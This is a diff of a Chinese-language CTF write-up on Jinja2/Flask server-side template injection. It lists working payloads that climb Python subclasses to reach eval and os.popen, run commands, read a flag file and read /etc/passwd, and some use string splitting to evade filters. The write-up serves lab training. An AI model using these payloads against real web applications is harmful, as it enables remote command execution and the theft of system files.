@@ -97,7 +97,7 @@ your input object基类的子类
 ## **利用**
 若经过{{''.__class__.__base__.__subclasses__()}}查询存在的类和位置后，可以借助的类反射调用方法：
 ```
-<class 'warnings.catch_warnings'>，没有内置os模块可能在第59位。
+<class 'warnings.catch_warnings'>，没有内置os模块可能在第59位。可以导入后命令执行。
 <class 'site._Printer'> 内含os模块（不需要import os） ，可能在第71位，可以借助这些类来执行命令。
 _io.TextIOWrapper 可以文件读取，可能在122位。
 ```
@@ -113,8 +113,7 @@ _io.TextIOWrapper 可以文件读取，可能在122位。
 读取flag
 {{[].__class__.__base__.__subclasses__()[59].__init__['__glo'+'bals__']['__builtins__']['eval']("__import__('os').popen('cat /flasklight/coomme_geeeett_youur_flek ').read()")}}
 
-一般
-{{().__class__.__bases__[0].__subclasses__()[59].__init__.__globals__.__builtins__['open']('/etc/passwd').read()}}
+
 ```
 
 2、site._Printer类利用：
@@ -126,11 +125,14 @@ _io.TextIOWrapper 可以文件读取，可能在122位。
 {{[].__class__.__base__.__subclasses__()[71].__init__['__glo'+'bals__']['os'].popen('ls /flasklight').read()}}
 读取flag
 {{[].__class__.__base__.__subclasses__()[71].__init__['__glo'+'bals__']['os'].popen('cat coomme_geeeett_youur_flek').read()}
+
+
 ```
 
 3、_io.TextIOWrapper类利用：
 ```
 {{[].__class__.__base__.__subclasses__()[122]('/flag').read()}}
+{{().__class__.__bases__[0].__subclasses__()[59].__init__.__globals__.__builtins__['open']('/etc/passwd').read()}}
 ```
 
 ^
